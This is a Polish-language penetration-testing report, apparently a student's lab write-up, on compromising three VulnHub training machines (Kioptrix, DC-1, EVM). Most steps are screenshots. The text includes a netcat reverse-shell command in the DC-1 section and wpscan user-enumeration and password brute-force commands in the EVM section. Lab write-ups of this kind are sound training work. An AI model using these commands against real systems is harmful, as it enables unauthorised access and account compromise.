# Sprawozdanie z testów penetracyjnych
# Michał Wawrzyńczak


## Wstępne skanowanie hostów i sieci:
Pierwszym etapem było pobranie ze strony VulnHub i zainstalowanie 3 maszyn wirtualnych:
- Kioptrix 1 - https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ 
- DC-1 - https://www.vulnhub.com/entry/dc-1,292/ 
- EVM: 1 -  https://www.vulnhub.com/entry/evm-1,391/ 

**Utworzyłem sieć wewnętrzną składającą się z tych 3 maszyn i hosta KaliLinux, a następnie przeprowadziłem kilka etapów skanowania wykorzystując różna narzędzia. Pierw wykorzystałem prosty skrypt aby określić jakie nowe adresy ip pojawiły się w sieci:**

![PingScan0](https://user-images.githubusercontent.com/56591106/72288546-93e51d80-3649-11ea-9c31-8ac785eba3bf.PNG)
![PingScan](https://user-images.githubusercontent.com/56591106/72288545-934c8700-3649-11ea-9fce-d9f012ebdbd0.PNG)

**Przeprowadziłem także skanowanie sieci, a także agresywne skanowanie nowych adresów IP przy użyciu nmapa:**
![nmapPing](https://user-images.githubusercontent.com/56591106/72288549-93e51d80-3649-11ea-8659-a3724f3ac3cc.PNG)
![nmapAgresiv](https://user-images.githubusercontent.com/56591106/72288536-90519680-3649-11ea-820a-d87e94d5e77d.PNG)

**Wszystkie 3 hosty przeskanowałem także przy użyciu narzędzi OpenVas i Nessus:**
![allOpenVas](https://user-images.githubusercontent.com/56591106/72289520-99436780-364b-11ea-9d3e-77d1a2ca1a66.PNG)
![allNessus](https://user-images.githubusercontent.com/56591106/72289521-99dbfe00-364b-11ea-8a83-e0147483533f.PNG)


## Pentest maszyny Kioptrix (192.168.12.14):

**Pierwszą maszyną której próby się podjąłem był Kioptrix, zacząłem od ponownego przeskanowania hosta przy użyciu n mapa, oraz przejżałem wyniki skanowań z OpenVasa i Nessusa:**
![KioptrixZenMap](https://user-images.githubusercontent.com/56591106/72288539-90ea2d00-3649-11ea-8be7-522fb187bee5.PNG)
![KioptrixOpenVas](https://user-images.githubusercontent.com/56591106/72289912-6a79c100-364c-11ea-9a1a-eaf02d8948c3.PNG)
![KioptrixNessus](https://user-images.githubusercontent.com/56591106/72289911-6a79c100-364c-11ea-9be3-6f2bc6660a6d.PNG)

**Następnie przystąpiłem do sprawdzania kolejnych usług dostępnych na hoscie, sprawdzałem czy są dostępne exploity na działające wersje usług, podczas działań posłużyłem się wyszukiwarką google i znalazłem coś co wyglądało obiecująco:**
https://www.exploit-db.com/exploits/764

**Sprawdziłem czy ten exploit dostępny jest w kali Linuxie:**
![searchsploit](https://user-images.githubusercontent.com/56591106/72290898-8716f880-364e-11ea-937d-9a94f6dc3ae9.PNG)

**Przy próbie kompilacji wystąpił jednak problem, który ciężko mi było rozwiązać, skorzystałem więc z dobrodziejstw dzisiejszego świata i poszukałem rozwiązania w internecie (wymagane były drobne poprawki w exploicie).**
![errory](https://user-images.githubusercontent.com/56591106/72291707-30aab980-3650-11ea-9e80-f32a8cf270bc.PNG)

**Po drobnej modyfikacji udało mi się skompilować exploit**
![compilation](https://user-images.githubusercontent.com/56591106/72291708-30aab980-3650-11ea-9014-2037f6021eb9.PNG)

**Następnie wybrałem porządany paramet exploita na określoną wersję usługi i uruchomiłem exploita**
![version](https://user-images.githubusercontent.com/56591106/72291705-30122300-3650-11ea-846c-ef3c2dcffd07.PNG)

**Udało mi się wejść do systemu jednak nie posiadałem uprawnień root'a:**
![apache](https://user-images.githubusercontent.com/56591106/72291706-30aab980-3650-11ea-8784-b91e7d5daba1.PNG)
![accesDenied](https://user-images.githubusercontent.com/56591106/72292238-466cae80-3651-11ea-9d51-eb6aa477fd2c.PNG)

**Podjąłem się więc próby uzyskania dostępu do konta roota, przeszukując exploity w matasploit natrafiłem na**
![exploit](https://user-images.githubusercontent.com/56591106/72294277-80d84a80-3655-11ea-98a3-5434632b82e2.PNG)

**Sprawdziłem kilka payloadów, z których ten okazał się skuteczny**
![payload3](https://user-images.githubusercontent.com/56591106/72294282-8170e100-3655-11ea-8f92-f95ca4ee3c77.PNG)

**Udało mi się nawiązać połączenie z hostem i uzyskać dostęp do jego powłoki**
![session](https://user-images.githubusercontent.com/56591106/72294278-80d84a80-3655-11ea-8ef7-7f3bd75e3892.PNG)

**W lokalizacji `var/mail/root`znalazłem takiego oto maila. Maszynę uznałem za złamaną"
![WIN](https://user-images.githubusercontent.com/56591106/72294281-80d84a80-3655-11ea-9924-f58fd555ffd5.PNG)

## Pentest maszyny DC-1 (192.168.12.12):
**Drugą maszyną którą starałem się złamać była DC-1, zacząłem od ponownego przeskanowania hosta przy użyciu n mapa, oraz przejżałem wyniki skanowań z OpenVasa i Nessusa:**
![zenMapDC](https://user-images.githubusercontent.com/56591106/72304554-2351f700-3671-11ea-9861-9f45cbbaa171.PNG)
![openVasDC](https://user-images.githubusercontent.com/56591106/72304475-ebe34a80-3670-11ea-95e9-9502707a0a11.PNG)
![nessusDC](https://user-images.githubusercontent.com/56591106/72304486-edad0e00-3670-11ea-8ae3-df9ad773bfbb.PNG)

**Następnie zacząłem przeszukiwać bazę exploitów i znalazłem coś co mnie zainteresowało**
![exploit31](https://user-images.githubusercontent.com/56591106/72304773-d28ece00-3671-11ea-9e42-5e047885a3ef.PNG)
![config](https://user-images.githubusercontent.com/56591106/72304482-ec7be100-3670-11ea-9c56-24efee915d3e.PNG)

**Niestety nie udało mi się w ten sposób uzyskać dostępu do roota**
![www-data](https://user-images.githubusercontent.com/56591106/72304483-ed147780-3670-11ea-8667-8a687aa57d8f.PNG)

**Zaciekawił mnie jadnak kolejny exploit, umożliwiający dodanie konta administratora do `drupal 7`**
![exploitAddAdmin](https://user-images.githubusercontent.com/56591106/72304478-ec7be100-3670-11ea-9707-330d092e44ce.PNG)
![addAdmin](https://user-images.githubusercontent.com/56591106/72304477-ebe34a80-3670-11ea-944c-d7ece8d0735b.PNG)
 
 **Po dodaniu konta administratora mogłem zalogowac się wybranym loginem i hasłem, w zakładce Modules mogłem dodać pobrany ze strony https://www.drupal.org/project/shell moduł powłoki**
![browseShell](https://user-images.githubusercontent.com/56591106/72304479-ec7be100-3670-11ea-9494-361773c8c3d9.PNG)
![installShell](https://user-images.githubusercontent.com/56591106/72304484-ed147780-3670-11ea-804f-420888e25d71.PNG)

**Mogłem w ten sposób uzyskac dostęp do powłki systemu jako www-data**
![shellStart](https://user-images.githubusercontent.com/56591106/72305129-1a622500-3673-11ea-9fa0-93f8fb7c36fc.PNG)

**Następni przu użyciu NetCata i poniższych komend uzyskałem dostęp do powłoki z poziomu terminala**
```
nc -nclp 1234 ==> komenda w terminalu Kalego, nasłuchwanie połączenia
nc -nv 192.168.12.8 1234 -e /bin/bash ==> z poziomu drupal shella, nawiązanie połączenia
```
![conecting](https://user-images.githubusercontent.com/56591106/72304485-ed147780-3670-11ea-8535-a07fbc51670f.PNG)

**Mają dostęp do powłoki (jeszcze nie jako root) wykonałem kilka poleceń, do których podpowiedzi odczytałem ze znalezionych flag, dzięki temu udało mi się uzyskać uprawnienia roota**
![Root](https://user-images.githubusercontent.com/56591106/72304476-ebe34a80-3670-11ea-97da-397cb7bfcbc3.PNG)

**Znalezione flagi**

![flag1](https://user-images.githubusercontent.com/56591106/72305564-78433c80-3674-11ea-9424-d451921cdbaf.PNG)
![flag3](https://user-images.githubusercontent.com/56591106/72305562-77aaa600-3674-11ea-9456-23ed67602698.PNG)
![flag4](https://user-images.githubusercontent.com/56591106/72305565-78433c80-3674-11ea-8d01-a0d37992b063.PNG)

**Finałowa flaga**
![finalflag](https://user-images.githubusercontent.com/56591106/72331786-0e995180-36b9-11ea-809f-5420c87593df.PNG)

**Maszyna przeze mnie uznana za złamaną**


## Pentest maszyny EVM (192.168.12.13):
**Trzecią maszyna to EVM, tak jak w poprzednich przypadkach zacząłem od skanowania zemMap, OpenVas i Nessus
![zenMapEVM](https://user-images.githubusercontent.com/56591106/72371206-2649f780-3704-11ea-883c-4b0913cdda98.PNG)
![OpenVas](https://user-images.githubusercontent.com/56591106/72371205-2649f780-3704-11ea-88e5-16ca3fff02e8.PNG)
![Nessus](https://user-images.githubusercontent.com/56591106/72371208-2649f780-3704-11ea-82d0-5e6ecd1e5ed9.PNG)

**Po wejściu na ip maszyny znajdujemy wskazówkę odnośnie aplikacji wordpress**
![ip](https://user-images.githubusercontent.com/56591106/72371209-26e28e00-3704-11ea-96bc-06ac1271418d.PNG)

**Wykonałem dodatkowo skanowanie przy użyciu dirb'a**
![dirb](https://user-images.githubusercontent.com/56591106/72371210-26e28e00-3704-11ea-8bfa-e63f10fb0046.PNG)

**Następnie przy użyciu `wpscan` u polecenia `wpscan --url 192.168.12.13/wordpress -e u` przeprowadziłem skanowanie i uzyskałałem login do usługi**
![user](https://user-images.githubusercontent.com/56591106/72371211-26e28e00-3704-11ea-933b-f230cd9b19c3.PNG)

**Następnie przeprowadziłem próbę złamania hasła bruteforcem `wpscan --url 192.168.12.13/wordpress --usernames c0rrupt3d_brain --passwords /usr/share/wordlists/rockyou.txt`**
![password](https://user-images.githubusercontent.com/56591106/72371213-277b2480-3704-11ea-83cf-4516f37eb7e7.PNG)

**Wyszukałem exploitów związanych z WordPressem, wybrałem jeden z nich i ustawiłem wszystkie parametry**
![searchsploit](https://user-images.githubusercontent.com/56591106/72371214-277b2480-3704-11ea-98e1-de2e1ab797ea.PNG)
![exploit](https://user-images.githubusercontent.com/56591106/72371216-2813bb00-3704-11ea-8d73-e318071a6ebc.PNG)

**Uruchomiłem powłokę i za dysku znalazłem plik `root_password_ssh.txt`**
![sshPassword](https://user-images.githubusercontent.com/56591106/72371217-2813bb00-3704-11ea-8552-de14d2740a51.PNG)

**Dzięki temu hasłu zyskałem uprawnienia roota na maszynie EVM**
![root](https://user-images.githubusercontent.com/56591106/72371218-2813bb00-3704-11ea-830c-68427e59d95a.PNG)

**W folderze root znalazłem plik z gratulacjami złamania maszyny**
![WIN](https://user-images.githubusercontent.com/56591106/72371204-2649f780-3704-11ea-9a83-808f5b22a552.PNG)
